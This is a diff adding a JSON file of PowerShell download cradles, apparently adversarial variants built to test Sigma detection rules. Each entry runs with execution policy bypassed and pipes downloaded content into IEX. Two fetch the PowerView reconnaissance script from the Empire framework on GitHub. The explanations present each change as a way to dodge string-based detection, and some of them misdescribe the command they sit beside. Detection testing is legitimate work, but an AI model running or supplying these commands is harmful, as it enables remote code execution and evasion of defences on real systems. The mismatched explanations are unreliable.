@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1')\"",
+    "explanation": "Reordering: Reordered the command-line arguments to ensure the suspicious keyword 'download' is not directly adjacent to the 'New-Object' construct, which may bypass string-based detection."
+  },
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"[System.Net.WebClient]::new().DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1') | IEX\"",
+    "explanation": "Substitution: Replaced 'New-Object Net.WebClient' with a direct instantiation of the WebClient class using bracket notation, which may not be captured by the same string matching rules."
+  },
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('C:\\Lab\\input\\sample.txt')\"",
+    "explanation": "Substitution: Replaced the remote URL with a local file path that does not contain any suspicious keywords, ensuring the command does not trigger the Sigma rule's detection criteria."
+  }
+]
